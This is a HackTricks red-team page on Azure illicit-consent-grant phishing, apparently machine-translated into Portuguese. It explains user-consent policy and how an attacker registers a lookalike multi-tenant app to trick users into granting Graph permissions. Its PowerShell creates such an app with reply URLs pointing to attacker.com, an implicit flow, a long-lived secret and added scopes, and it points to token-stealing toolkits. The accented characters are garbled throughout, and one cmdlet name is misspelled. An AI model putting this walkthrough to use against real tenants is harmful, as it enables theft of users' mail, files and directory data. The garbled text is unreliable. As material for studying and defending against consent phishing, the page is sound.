# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Aplica√ß√µes Azure** pedem permiss√µes para acessar os **dados do usu√°rio** (informa√ß√µes b√°sicas, mas tamb√©m acesso a documentos, enviar e-mails...).\
Se **permitido**, um usu√°rio normal pode conceder consentimento apenas para **"permiss√µes de baixo impacto"**. Em **todos os outros** casos, **o consentimento do administrador √© necess√°rio**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e um papel personalizado que inclua `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em toda a locat√°ria.

Somente permiss√µes que **n√£o requerem consentimento do administrador** s√£o classificadas como **baixo impacto**. Essas s√£o permiss√µes necess√°rias para **o login b√°sico, que s√£o openid, profile, email, User.Read e offline_access**. Se uma **organiza√ß√£o** **permitir** o consentimento do usu√°rio para **todos os aplicativos**, um funcion√°rio pode conceder consentimento a um aplicativo para **ler o acima de seu perfil**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Portanto, um atacante poderia preparar um **Aplicativo malicioso** e com um **phishing**, fazer o usu√°rio **aceitar o Aplicativo e roubar seus dados**.

### 2 Tipos de Ataques de Concess√£o de Consentimento Il√≠cito

* **N√£o autenticado**: A partir de uma conta externa, crie um aplicativo com as permiss√µes `User.Read` e `User.ReadBasic.All`, por exemplo, phishing de um usu√°rio, e voc√™ poder√° acessar informa√ß√µes do diret√≥rio.
* Isso requer que o usu√°rio phishing possa aceitar aplicativos OAuth de ambientes externos!
* **Autenticado**: Tendo comprometido um principal com privil√©gios suficientes, crie um aplicativo dentro da conta e phishing de algum usu√°rio privilegiado que possa aceitar permiss√µes OAuth privilegiadas.
* Nesse caso, voc√™ j√° pode acessar as informa√ß√µes do diret√≥rio, ent√£o a permiss√£o `User.ReadBasic.All` n√£o √© mais interessante.
* Voc√™ provavelmente est√° interessado em **permiss√µes que requerem um administrador para conced√™-las**, porque um usu√°rio comum n√£o pode dar permiss√µes a aplicativos OAuth, por isso voc√™ precisa **phishing apenas aqueles usu√°rios** (mais sobre quais pap√©is/permiss√µes concedem esse privil√©gio mais tarde)

### Verificar se os usu√°rios podem consentir

O seguinte comando PowerShell √© usado para verificar a configura√ß√£o de consentimento para usu√°rios no Azure Active Directory (Azure AD) em rela√ß√£o √† sua capacidade de consentir a aplicativos:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Desativar o consentimento do usu√°rio**: Esta configura√ß√£o pro√≠be os usu√°rios de conceder permiss√µes a aplicativos. Nenhum consentimento de usu√°rio para aplicativos √© permitido.
* **Os usu√°rios podem consentir a aplicativos de editores verificados ou da sua organiza√ß√£o, mas apenas para permiss√µes que voc√™ selecionar**: Esta configura√ß√£o permite que todos os usu√°rios consintam apenas a aplicativos que s√£o publicados por um editor verificado e aplicativos registrados em seu pr√≥prio locat√°rio. Ela adiciona uma camada de controle permitindo o consentimento apenas para permiss√µes espec√≠ficas.
* **Os usu√°rios podem consentir a todos os aplicativos**: Esta configura√ß√£o √© mais permissiva e permite que todos os usu√°rios consintam a quaisquer permiss√µes para aplicativos, desde que essas permiss√µes n√£o exijam consentimento administrativo.
* **Pol√≠tica de consentimento de aplicativo personalizada**: Esta configura√ß√£o indica que uma pol√≠tica personalizada est√° em vigor, que pode ser adaptada a requisitos organizacionais espec√≠ficos e pode envolver uma combina√ß√£o de restri√ß√µes com base no editor do aplicativo, nas permiss√µes que o aplicativo solicita e em outros fatores.

## **Entendendo o Ataque de Concess√£o de Consentimento Il√≠cito**

Em um ataque de concess√£o de consentimento il√≠cito, os atacantes enganam os usu√°rios finais para conceder permiss√µes a um aplicativo malicioso registrado no Azure. Isso √© feito fazendo o aplicativo parecer leg√≠timo, levando as v√≠timas a clicarem inadvertidamente em um bot√£o "Aceitar". Como resultado, o Azure AD emite um token para o site do atacante, permitindo que eles acessem e manipulem os dados da v√≠tima, como ler ou enviar e-mails e acessar arquivos, sem precisar de uma conta organizacional.

## **Vis√£o Geral do Fluxo de Ataque**

O ataque envolve v√°rias etapas direcionadas a uma empresa gen√©rica. Veja como pode se desenrolar:

1. **Registro de Dom√≠nio e Hospedagem de Aplicativo**: O atacante registra um dom√≠nio que se assemelha a um site confi√°vel, por exemplo, "safedomainlogin.com". Sob este dom√≠nio, um subdom√≠nio √© criado (por exemplo, "companyname.safedomainlogin.com") para hospedar um aplicativo projetado para capturar c√≥digos de autoriza√ß√£o e solicitar tokens de acesso.
2. **Registro de Aplicativo no Azure AD**: O atacante ent√£o registra um Aplicativo Multi-Tenant em seu Locat√°rio do Azure AD, nomeando-o ap√≥s a empresa-alvo para parecer leg√≠timo. Eles configuram a URL de Redirecionamento do aplicativo para apontar para o subdom√≠nio que hospeda o aplicativo malicioso.
3. **Configura√ß√£o de Permiss√µes**: O atacante configura o aplicativo com v√°rias permiss√µes de API (por exemplo, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Essas permiss√µes, uma vez concedidas pelo usu√°rio, permitem que o atacante extraia informa√ß√µes sens√≠veis em nome do usu√°rio.
4. **Distribui√ß√£o de Links Maliciosos**: O atacante cria um link contendo o ID do cliente do aplicativo malicioso e o compartilha com usu√°rios-alvo, enganando-os para conceder consentimento.

## **Utilizando Ferramentas para o Ataque**

O ataque pode ser facilitado usando ferramentas como [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Prepara√ß√£o Pr√©-Ataque:

Se o atacante tiver algum n√≠vel de acesso a um usu√°rio na organiza√ß√£o da v√≠tima, ele pode verificar se a pol√≠tica da organiza√ß√£o permite que o usu√°rio aceite aplicativos:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Para executar o ataque, o atacante precisaria criar um **novo App em seu Azure Tenant** (em Registros de Aplicativos), configurado com as permiss√µes:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` est√° dentro de `Microsoft Graph` em `Permiss√µes Delegadas`. (As permiss√µes de aplicativo sempre precisar√£o de aprova√ß√£o extra).

* `User.ReadBasic.All` √© a permiss√£o que permitir√° que voc√™ **leia informa√ß√µes de todos os usu√°rios** na organiza√ß√£o, se concedida.
* Lembre-se de que apenas `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e um papel personalizado que inclua `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em toda a locat√°ria. Portanto, voc√™ deve **phish um usu√°rio com um desses pap√©is** se quiser que ele aprove um **App que requer consentimento de administrador**.

Voc√™ tamb√©m pode criar um App via cli com: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Verifique [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender como configur√°-lo.

{% hint style="warning" %}
Observe que o **token de acesso** obtido ser√° para o **endpoint graph** com os escopos: `User.Read` e `User.ReadBasic.All` (as permiss√µes solicitadas). Voc√™ n√£o poder√° realizar outras a√ß√µes (mas essas s√£o suficientes para **baixar informa√ß√µes sobre todos os usu√°rios** na organiza√ß√£o).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Voc√™ tamb√©m pode usar esta ferramenta para realizar este ataque.

## P√≥s-Explora√ß√£o

Uma vez que voc√™ tenha acesso ao usu√°rio, pode fazer coisas como roubar documentos sens√≠veis e at√© fazer upload de arquivos de documentos com backdoor.

## Refer√™ncias

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
